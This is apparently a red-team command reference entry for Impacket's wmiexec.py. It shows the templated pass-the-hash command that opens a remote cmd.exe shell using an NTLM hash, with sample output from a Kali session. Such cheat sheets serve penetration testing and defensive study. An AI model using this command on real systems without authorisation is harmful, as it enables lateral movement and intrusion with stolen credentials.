---
id: 9ad9a14d-3fbf-4139-93d2-7030bc6b9ada
name: wmiexec.py Spawn a cmd.exe shell on a Remote System (NTLM)
type: command
executor: ''
data: wmiexec.py $_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
output: 'root@kali:~# wmiexec.py Bob@10.10.10.10 -hashes :6608e4bc7b2b7a5f77ce3573570775af

  Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation


  INFO:root:SMBv3.0 dialect used

  [!] Launching semi-interactive shell - Careful what you execute

  [!] Press help for extra shell commands

  C:\>'
created_at: '2019-10-01T17:58:48.949764+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Impacket]]'
---

# wmiexec.py Spawn a cmd.exe shell on a Remote System (NTLM)

```bash
wmiexec.py $_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
```

## Expected Output

```
root@kali:~# wmiexec.py Bob@10.10.10.10 -hashes :6608e4bc7b2b7a5f77ce3573570775af
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

INFO:root:SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```


